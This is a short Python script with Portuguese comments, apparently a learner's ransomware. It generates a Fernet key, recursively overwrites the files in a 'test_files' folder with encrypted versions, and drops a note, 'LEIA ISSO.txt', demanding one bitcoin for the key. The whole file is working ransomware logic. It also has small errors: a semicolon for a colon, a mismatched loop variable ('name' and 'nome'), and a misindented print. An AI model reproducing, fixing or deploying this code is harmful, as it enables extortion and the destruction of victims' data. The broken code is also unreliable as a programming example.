from cryptography.fernet import Fernet
import os

#1. Gerar uma chave de criptografia e depois salvar!

def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file;
        chave_file.write(chave)

#2. Carregar a chave que foi salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Cripetografar um arquivo único
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4. Encontrar os arquivos que serão criptografados
def encontrar_arquivos(diretorio):
    lista = []   
    for raiz, _, arquivos in os.walk(diretorio):
        for name in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem para o resgate dos dados
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt", "w") as f:
        f.write("Seus dados foram criptografados!!\n")
        f.write("Envie 1 bitcoin para o endereço XXX e envie o comprovante!!\n")
        f.write("Depois enviaremos a chave para que possa recuperar seus dados")

#6. Execução Principal do código
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
        print("Ransoware executado! Arquivos criptografados!!")

if __name__== "__main__":
    main()

